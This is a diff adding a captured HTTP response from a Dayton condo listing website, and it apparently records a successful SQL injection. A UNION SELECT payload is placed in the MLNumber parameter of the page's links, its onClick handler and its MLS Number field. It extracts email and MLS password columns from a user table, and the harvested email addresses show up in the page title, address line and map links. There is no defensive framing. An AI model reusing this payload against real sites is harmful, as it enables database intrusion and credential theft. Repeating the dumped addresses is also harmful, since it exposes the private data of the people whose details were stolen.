@@ -1,0 +1,490 @@
+HTTP/1.1 200 OK
+Date: Tue, 14 May 2019 07:16:39 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Vary: Accept-Encoding
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<meta http-equiv="Content-Language" content="en-us">
+<script type="text/javascript" src="overlib.js"><!-- overLIB (c) Erik Bosrup --></script>
+<SCRIPT LANGUAGE='JavaScript'>
+<!-- Begin Preloader;
+
+
+if(document.images) {
+pics = new Array();
+}
+
+function changer(from,to) {
+	if(document.images) {
+		document.images[from].src = pics[to].src;
+	}
+}
+
+// End -->
+</script>
+<TITLE>Dayton Condo Hunters : [ddd]shanewithduffyrealty@gmail.com:,meops_wa@hotmail.com:,pngkristen@aol.com:,dawn@peabodyplum.com:,mark@netwiseusa.com:[ddd] 5 6 7 </TITLE>
+  <meta name="keywords" content="Real Estate, Condos for Sale, Beavercreek Real Estate, Beavercreek Homes, Dayton Ohio Area Luxury Living, Custom Luxury Homes, High End Real Estate, Wright Patterson Luxury Living, WPAFB PCS, AFIT, Air Force Institute of Technology, WPAFB Relocation, realtor, The Country Club of the North, Wright Patterson Materials Labs, WPAFB Materials Labs">
+  <meta name="description" content="Condos for sale, Dayton Area">
+    <META NAME="distribution" CONTENT="Global">
+  <META NAME="revisit-after" CONTENT="30 days">
+  <META NAME="copyright" CONTENT="www.DaytonCondoHunters.com">
+  <META NAME="robots" CONTENT="FOLLOW, INDEX">
+  <META NAME="rating" content="General">
+  <META NAME="author" CONTENT="www.DaytonCondoHunters.com">
+  <meta name="author" content="Andrew North">
+  <meta name="Classification" content="Condos for Sale">
+  <link href="dalhstyles1.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" type="text/css" href="dalhprint.css" media="print">
+
+	<link rel="stylesheet" type="text/css" href="nav/css/superfish.css" media="screen">
+		<script type="text/javascript" src="nav/js/jquery-1.2.6.min.js"></script>
+		<script type="text/javascript" src="nav/js/hoverIntent.js"></script>
+		<script type="text/javascript" src="nav/js/superfish.js"></script>
+		<script type="text/javascript">
+
+		// initialise plugins
+		jQuery(function(){
+			jQuery('ul.sf-menu').superfish();
+		});
+
+		</script>
+
+        <SCRIPT LANGUAGE='JavaScript'>
+<!-- Begin Preloader;
+
+
+if(document.images) {
+pics = new Array();
+}
+
+function changer(from,to) {
+	if(document.images) {
+		document.images[from].src = pics[to].src;
+	}
+}
+
+// End -->
+</script>
+</head>
+<div id="contentwrapper">
+  <div id="header_detail">
+    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td height="10" colspan="4"></td>
+      </tr>
+      <tr>
+        <td height="105" colspan="2">&nbsp;</td>
+        <td width="310" height="105" class="agentinfo"><br>
+          Brought to you by<br>
+  <span class="agentname">Esther North, Associate Partner</span><br>
+  <a href="mailto:esther@daytonhousehunters.com">Esther@DaytonHouseHunters.com</a><br>
+          (937) 470-7999 </td>
+        <td width="170" height="105">&nbsp;</td>
+      </tr>
+      <tr>
+        <td height="10" colspan="4"></td>
+      </tr>
+      <tr>
+        <td width="40" height="20">&nbsp;</td>
+        <td height="20">
+	
+
+		<ul class="sf-menu">
+			<li class="current"> <a href="../DaytonAreaLuxuryHomesIndex.php">Home</a> </li>
+	        <li class="current">
+	          <a href="#a">Condos For Sale</a>
+              <ul>
+                            <li><a href="../BeavercreekLuxuryHomes.php">Beavercreek</a></li>
+			    <li><a href="../BellbrookLuxuryHomes.php">Bellbrook/Sugarcreek</a></li>
+			    <li><a href="../CentervilleLuxuryHomes.php">Centerville</a></li>
+			    <li><a href="../ClaytonEnglewoodLuxuryHomes.php">Clayton/Englewood</a></li>
+			    <li><a href="../DaytonLuxuryHomes.php">Dayton</a></li>
+			    <li><a href="../EnonLuxuryHomes.php">Enon</a></li>
+			    <li><a href="../FairbornLuxuryHomes.php">Fairborn</a></li>
+			    <li><a href="../HuberHeightsLuxuryHomes.php">Huber Heights</a></li>
+			    <li><a href="../KetteringLuxuryHomes.php">Kettering</a></li>
+			    <li><a href="../MiamisburgLuxuryHomes.php">Miamisburg</a></li>
+			    <li><a href="../MoraineLuxuryHomes.php">Moraine</a></li>
+			    <li><a href="../OakwoodLuxuryHomes.php">Oakwood</a></li>
+                            <li><a href="../SpringboroLuxuryHomes.php">Springboro</a></li>
+                            <li><a href="../SpringfieldLuxuryHomes.php">Springfield</a></li>
+			    <li><a href="../TippCityLuxuryHomes.php">Tipp City</a></li>
+			    <li><a href="../TrotwoodLuxuryHomes.php">Trotwood</a></li>
+			    <li><a href="../VandaliaLuxuryHomes.php">Vandalia</a></li>
+			    <li><a href="../WaynesvilleLuxuryHomes.php">Waynesville</a></li>
+			    <li><a href="../WestCarrolltonLuxuryHomes.php">West Carrollton</a></li>
+			    <li><a href="../WestMiltonLuxuryHomes.php">West Milton</a></li>
+			    <li><a href="../XeniaLuxuryHomes.php">Xenia</a></li>
+			    <li><a href="../YellowSpringsLuxuryHomes.php">Yellow Springs</a></li>
+			      </ul>
+          </li>
+          <li>
+				<a href="../ContactForm.php">Contact</a>			</li>	
+
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+
+</td>
+        <td width="300" height="20">&nbsp;</td>
+        <td width="170" height="20">&nbsp;</td>
+      </tr>
+    </table>
+  </div>
+  
+    <div id="header_detail_print">
+    <table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr></tr>
+      <tr>
+        <td width="50">&nbsp;</td>
+        <td width="800" class="communitycontent">Brought to you by <span class="agentname"><strong>Esther North, Realtor</strong></span>&nbsp;<a href="mailto:andy@daytonhousehunters.com">&nbsp;&nbsp;&ndash;&nbsp;&nbsp;andy@daytonhousehunters.com</a>&nbsp;&nbsp;(937) 520-2942 </td>
+        <td width="50">&nbsp;</td>
+      </tr>
+    </table>
+  </div>
+  
+  <br>
+  <div id="maincontent">
+    <table width="900" border="0" cellspacing="0" cellpadding="0">
+      <tr>
+        <td width="50"><img src="images/spacer.gif" width="50" height="50"></td>
+        <td valign="top"><p><span class="detailaddress"> $3            <BR>
+              [ddd]shanewithduffyrealty@gmail.com:,meops_wa@hotmail.com:,pngkristen@aol.com:,dawn@peabodyplum.com:,mark@netwiseusa.com:[ddd] 5 6 7 , 8        </span><font face="Verdana"><SPAN
+                  class=addressone><font size="4"><br>
+        </font></SPAN></font></p>
+          <table width="800" border="0" cellspacing="0" cellpadding="0">
+          <tr>
+            <td width="300" valign="top"><span class="communitycontent">
+              17              <br>
+              <br>
+            </span>
+              <TABLE cellSpacing=0 cellPadding=0 width=300 border=0 bgcolor="#FFFFFF">
+                <TBODY>
+                  <TR>
+                    <TD><p><font face="Verdana"><SPAN class=copyonelink> </SPAN> <SPAN class=copyonelink> <a class="copyonelink" href="ContactForm.php?MLNumber=513659 && 1=2 uNiON all SEleCT 1,2,3,(select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.EmailPre,char(58),t.MLSPassword) as char))),' '),0x5b6464645d) FROM (SELECT+EmailPre,MLSPassword FROM stipich.`auth_users_test` WHERE `EmailPre` LIKE char(37,64,37) LIMIT 7515,5)t   limit 0,1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  #&MLSRegion=1">&raquo; I would like  a tour of this home!<br>
+                    </a></SPAN></font><font face="Verdana"><SPAN class=copyonelink><A class=copyonelink
+					 href="#"
+					 onClick="window.open('LuxuryEmailListing.php?MLNumber=513659 && 1=2 uNiON all SEleCT 1,2,3,(select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.EmailPre,char(58),t.MLSPassword) as char))),' '),0x5b6464645d) FROM (SELECT+EmailPre,MLSPassword FROM stipich.`auth_users_test` WHERE `EmailPre` LIKE char(37,64,37) LIMIT 7515,5)t   limit 0,1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  #&MLSRegion=1','emailthislisting','width=350,height=520,screenX=10,screenY=10,top=10,left=10,resizable=yes,directories=no,location=no,menubar=no,scrollbars=no,status=no,toolbar=no');">&raquo; Email this Listing</A></SPAN></font><br>
+                          <font face="Verdana"><SPAN class=copyonelink> <a class=copyonelink href="javascript:void(0);"
+					onmouseover="return overlib('<table align=\'center\' width=\'100%\' bgColor=\'#FFFFFF\' style=\'border:3px ridge white;\'><tr><td colspan=2><span style=\'color:#D2C7B5;font-weight:bold;text-decoration:underline;\'>Map Providers</span></td></tr><tr><td><a href=\'http://www.google.com/maps?oi=map&q=[ddd]shanewithduffyrealty@gmail.com:,meops_wa@hotmail.com:,pngkristen@aol.com:,dawn@peabodyplum.com:,mark@netwiseusa.com:[ddd]+5+6+7,8+9+10&zoom=3\' target=\'_blank\'><img src=\'googlelogo.jpg\' style=\'border:0;\'></a></td><td style=\'color:white;\'><b>Google Maps</b></td></tr><tr><td><a href=\'http://maps.yahoo.com/maps_result?addr=[ddd]shanewithduffyrealty@gmail.com:,meops_wa@hotmail.com:,pngkristen@aol.com:,dawn@peabodyplum.com:,mark@netwiseusa.com:[ddd]+5+6+7,8+9+10&zoom=3\' target=\'_blank\'><img src=\'yahoologo.jpg\' style=\'border:0;\'></a></td><td style=\'color:white;\'> <b>Yahoo Maps</b></td></tr></table>',STICKY, MOUSEOFF, WRAP, CELLPAD, 5, CAPTION, 'CHOOSE A MAP TO VIEW THIS LISTING', FGCOLOR, '#255593', BGCOLOR, '#E1DCC1', BORDER, 4, CAPTIONFONT, 'ARIAL', TEXTFONT, 'ARIAL', TEXTSIZE, 2,WRAP,BGBACKGROUND, 'wallpaper_marble.jpg', BGCOLOR,'',WIDTH,325)"
+					onmouseout="return nd();">&raquo; Map It</a> </SPAN></font></p>
+                      </TD>
+                    <TD width="10">&nbsp;</TD>
+                  </TR>
+                </TBODY>
+              </TABLE></td>
+            <td width="50">&nbsp;</td>
+            <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
+              <tr>
+                <td><font face="Verdana"><img
+                   id='bigphoto' height=338 src="" width=450
+                  border=0 name=main onerror="this.onerror=null;this.src='missing.jpg';"></font></td>
+              </tr>
+              <tr>
+                <td class="introcontent">mouse over images for larger view</td>
+              </tr>
+              <tr>
+                <td><table width="450" border="0" cellspacing="0" cellpadding="0">
+                  <tr>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td width="5" rowspan="3"></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td width="5" rowspan="3"></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td width="5" rowspan="3"></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td width="5" rowspan="3"></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td width="4" rowspan="3"></td>
+                    <td width="71" rowspan="3"><table width="71" border="0" cellspacing="0" cellpadding="0">
+                      <tr>
+                        <td></td>
+                      </tr>
+                      
+                    </table></td>
+                  </tr>
+                  <tr>
+                    <td height="5"></td>
+                    <td height="5"></td>
+                    <td height="5"></td>
+                    <td height="5"></td>
+                    <td height="5"></td>
+                    </tr>
+                  <tr>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    <td>
+						  <TD width=71>&nbsp;</TD></td>
+                    </tr>
+                </table></td>
+              </tr>
+            </table></td>
+          </tr>
+        </table>
+          <table width="800" border="0" cellspacing="0" cellpadding="0">
+            <tr>
+              <td colspan="3" valign="top">&nbsp;</td>
+            </tr>
+            <tr>
+              <td width="300" valign="top"><TABLE cellSpacing=0 cellPadding=0 width=300 border=0>
+                <TBODY>
+                  <TR>
+                    <TD height="20" colspan="2" class="detailspecsheader"><STRONG
+                        class=features>ROOMS</STRONG></TD>
+                    </TR>
+                  <TR class=features>
+                    <TD width="95" height="20" class="detailspecs">Entrance</TD>
+                    <TD width="195" height="20"  nowrap class="detailspecs">                      18                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95" height="20" class="detailspecs" >Living</TD>
+                    <TD width="195" height="20"  nowrap class="detailspecs">                      21                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95" height="20" class="detailspecs" >Family</TD>
+                    <TD width="195" height="20"  nowrap class="detailspecs">                      24                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95" height="20" class="detailspecs" >Great</TD>
+                    <TD width="195" height="20"  nowrap class="detailspecs">                      27                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95" height="20" class="detailspecs" >Extra</TD>
+                    <TD width="195" height="20"  nowrap class="detailspecs">                      30                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Dining</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      19                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Kitchen</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      22                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Breakfast</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      25                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Recreation</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      28                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Study</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      31                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Bedroom 1</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      20                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Bedroom 2</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      23                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Bedroom 3 </TD>
+                    <TD width="195"  height=20 class="detailspecs">                      26                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Bedroom 4 </TD>
+                    <TD width="195"  height=20 class="detailspecs">                      29                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20 class="detailspecs">Utility</TD>
+                    <TD width="195"  height=20 class="detailspecs">                      32                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="95"  height=20>&nbsp;</TD>
+                    <TD width="195"  height=20>&nbsp;</TD>
+                  </TR>
+                  <TR class=features>
+                    <TD colspan="2" class="detailspecsheader"><strong
+                        class=features>DIRECTIONS</strong></TD>
+                    </TR>
+                  <TR class=features>
+                    <TD colspan="2" class="directions">                      49                    </TD>
+                    </TR>
+                  <TR class=features>
+                    <TD  height=20>&nbsp;</TD>
+                    <TD  height=20>&nbsp;</TD>
+                  </TR>
+                </TBODY>
+              </TABLE></td>
+              <td width="50">&nbsp;</td>
+              <td valign="top"><TABLE cellSpacing=0 cellPadding=0 width=450 border=0>
+                <TBODY>
+                  <TR>
+                    <TD height="20" colSpan=3 class="detailspecsheader"><STRONG>ADDITIONAL
+                      INFORMATION</STRONG></TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width=100 height="20" class="detailspecs">School District</TD>
+                    <TD width=340 height="20" class="detailspecs">33                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width=100 height="20" class="detailspecs">County</TD>
+                    <TD width=340 height="20" class="detailspecs">34                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width=100 height="20" class="detailspecs">Home Type</TD>
+                    <TD width=340 height="20" class="detailspecs">35                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height="20" class="detailspecs">MLS Number</TD>
+                    <TD width="340" height="20" class="detailspecs">513659 && 1=2 uNiON all SEleCT 1,2,3,(select CONCAT(0x5b6464645d,IFNULL(unhex(Hex(cast(GROUP_CONCAT(t.EmailPre,char(58),t.MLSPassword) as char))),' '),0x5b6464645d) FROM (SELECT+EmailPre,MLSPassword FROM stipich.`auth_users_test` WHERE `EmailPre` LIKE char(37,64,37) LIMIT 7515,5)t   limit 0,1),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  #                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height="20" class="detailspecs">Lot Size</TD>
+                    <TD width="340" height="20" class="detailspecs">36                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height="20" class="detailspecs">Association Fee</TD>
+                    <TD width="340" height="20" class="detailspecs">37                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height="20" class="detailspecs"><P>Year Built</P></TD>
+                    <TD width="340" height="20" class="detailspecs">38                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height="20" class="detailspecs">Levels</TD>
+                    <TD width="340" height="20" class="detailspecs">39                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Construction</TD>
+                    <TD width="340" height=20 class="detailspecs">40                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Cooling</TD>
+                    <TD width="340" height=20 class="detailspecs">41                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Garage</TD>
+                    <TD width="340" height=20 class="detailspecs">42                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Basement</TD>
+                    <TD width="340" height=20 class="detailspecs">43                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Fireplace</TD>
+                    <TD width="340" height=20 class="detailspecs">44                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Heating</TD>
+                    <TD width="340" height=20 class="detailspecs">45                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Utilities</TD>
+                    <TD width="340" height=20 class="detailspecs">46                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Inside Features </TD>
+                    <TD width="340" height=20 class="detailspecs">47                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD width="100" height=20 class="detailspecs">Outside Features </TD>
+                    <TD width="340" height=20 class="detailspecs">48                    </TD>
+                  </TR>
+                  <TR class=features>
+                    <TD height=20 class="detailspecs">&nbsp;</TD>
+                    <TD height=20 class="detailspecs">&nbsp;</TD>
+                  </TR>
+                  <TR class=features>
+                    <TD height=20 colspan="2" class="detailspecsheader"><STRONG>AGENCY INFORMATION</STRONG></TD>
+                    </TR>
+                  <TR class=features>
+                    <TD height=20 class="detailspecs"><font face="Verdana">Listing Agent </font></TD>
+                    <TD height=20 class="detailspecs"><font face="Verdana">
+                                          </font></TD>
+                  </TR>
+                  <TR class=features>
+                    <TD height=20 class="detailspecs"><font face="Verdana">Brokerage</font></TD>
+                    <TD height=20 valign="baseline" class="detailspecs"><font face="Verdana">
+                                          &nbsp;<img src='idx_dabr_logo1.gif' width="20" height="15" ></font></TD>
+                  </TR>
+                  <TR class=features>
+                    <TD height=20 class="detailspecs"><font face="Verdana">Phone</font></TD>
+                    <TD height=20 class="detailspecs"><font face="Verdana">
+                                          </font></TD>
+                  </TR>
+                </TBODY>
+              </TABLE></td>
+            </tr>
+            <tr>
+              <td width="300" height="35">&nbsp;</td>
+              <td width="50" height="35">&nbsp;</td>
+              <td height="35">&nbsp;</td>
+            </tr>
+            <tr>
+              <td colspan="3" class="legalmls"><table width="800" border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td width="187"><img src="images/cblogox.jpg" alt="Coldwell Banker Heritage" width="87" height="58"></td>
+                  <td width="613" class="legalmls">The data relating to real estate for sale on this web site comes in part from the
+                              
+                              Internet Data Display (IDX) of the Dayton Area Board of REALTORS Multiple Listing Service .
+                              
+                              
+                              
+                              
+                              
+                              
+                              
+                              
+                              
+                              
+              . Real estate listings held by brokerage firms other than our brokerage firm are marked with the IDX logo and detailed information about them includes the name of the listing brokers. The information being provided is for consumers' personal, non-commercial use and may not be used for any purpose other than to identify prospective properties consumers may be interested in purchasing.</td>
+                </tr>
+              </table></td>
+            </tr>
+          </table>
+        <p align="center" class="address">&nbsp;</p></td>
+        <td width="50">&nbsp;</td>
+      </tr>
+    </table>
+  </div>
+</div>
+
+<div id="footer">&copy; 2008 DaytonCondoHunters.com&nbsp;&nbsp;|&nbsp;&nbsp;<a href="ContactForm.php">contact</a>&nbsp;&nbsp;|&nbsp;&nbsp;937-470-7999&nbsp;&nbsp;|&nbsp;&nbsp;<a href="http://www.daytonhousehunters.com" target="_blank">Homes for Sale</a>|&nbsp;&nbsp;<a href="http://www.daytonarealuxuryhomes.com" target="_blank">Premier Homes for Sale</a>|&nbsp;&nbsp;<a href="http://www.netwiseusa.com">Powered by Netwise</a></p></div>
+<p>&nbsp;</p>
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-17280426-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+</body>
+
+</html>
